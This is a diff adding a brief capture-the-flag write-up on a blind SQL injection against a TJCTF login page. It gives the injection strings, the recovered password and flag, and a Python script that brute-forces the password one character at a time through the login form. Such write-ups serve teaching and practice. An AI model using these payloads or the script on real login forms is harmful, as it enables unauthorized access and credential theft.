@@ -1,0 +1,62 @@
+We get an login form. Our injection from the challenge SequelLogin gets use logged in.
+
+But we dont get the flag. So we will do an blindsqlinjection !
+
+First trying to figure out the length of the password :
+
+admin' AND length(password)>1/*
+
+Password Length : 7
+
+Now as the hint says the password is only lowercase letters.
+
+admin' AND password LIKE 'a%';/*
+
+We changed a% to ( a-z) . When we get logged in that means we got correct character.
+
+Finally we had: admin' AND password LIKE 'blind%';/*
+
+We get the password : blinded
+
+FLAG : tjctf{blinded}
+
+```
+import requests
+from string import ascii_letters
+
+# "SELECT username, password FROM `userandpassword` WHERE username=\'%s\' AND password=\'%s\'" % (username, hashlib.md5(password.encode()))
+
+
+msg = 'Wrong username or password'
+
+def inject(cmd):
+
+        url = 'https://weak_password.tjctf.org/login'
+
+        data = {
+                'username' : cmd,
+                'password' : 'pass'
+        }
+
+        r = requests.post(url, data=data)
+
+        # print(r.text)
+        # fail = 'SQL injection detected.' 
+        if msg not in r.text:
+                print(f'{cmd}')
+                return True
+        return False
+
+
+password = ''
+while True:
+    for ch in ascii_letters:
+            print(f'Trying {password}{ch}')
+            # cmd = f"admin' AND 1=(SELECT password FROM userandpassword WHERE password LIKE '{i}%') --."
+            cmd = f"""admin' AND password LIKE '{password}{ch}%';/*"""
+            if (inject(cmd)):
+                password += ch
+                print(f'Found : {password}')
+print('done')
+
+```
